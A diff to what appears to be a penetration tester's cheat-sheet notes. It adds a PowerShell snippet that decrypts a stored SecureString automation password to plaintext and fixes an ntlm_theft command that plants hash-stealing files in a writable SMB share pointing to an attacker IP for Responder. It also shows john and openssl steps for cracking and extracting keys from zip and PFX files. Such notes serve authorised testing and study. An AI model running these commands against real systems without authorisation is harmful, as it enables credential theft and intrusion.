@@ -34,12 +34,21 @@
 1. ``` zip2john {original} > {new.hash} ```
 2. ``` john {new.hash} --wordlist=/opt/wordlists/rockyou.txt ```
 
-# Pfx crack
+## Pfx crack
 1. ``` pfx2john {original} > {new.hash}```
 2. ``` john {new.hash} --wordlist=/opt/wordlists/rockyou.txt ```
 - ``` openssl pkcs12 -in {xxx.pfx} -info ``` Get general print data
 - ``` openssl pkcs12 -in {xxx.pfx} -nocerts -out key.pem -nodes ``` Get private key
 - ``` openssl pkcs12 -in {xxx.pfx} -nokeys -out key.cert ``` Get public key
+
+## Windows Automation Account Password (SecuredString) Decrypt
+- ```
+    $SecurePassword = Get-Content automation.txt | ConvertTo-SecureString
+    $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
+    $UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+    [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)
+    $UnsecurePassword
+  ```
 
 ## VNC decrypt
 - https://github.com/frizb/PasswordDecrypts
@@ -135,7 +144,7 @@
 ## Putting theif executable in SMB (If writable)
 1. NTLM-Theif https://github.com/Greenwolf/ntlm_theft
    ```
-    python3 ~/Downloads/WindowUsefulTools/ntlm_theft/ntlm theft.py -g all -s {ip} -f {foldername}
+    python3 ~/Downloads/WindowUsefulTools/ntlm_theft/ntlm_theft.py -g all -s {ip} -f {foldername}
    ```
 2. cd to the folder 
 3. Start respond.py in another place
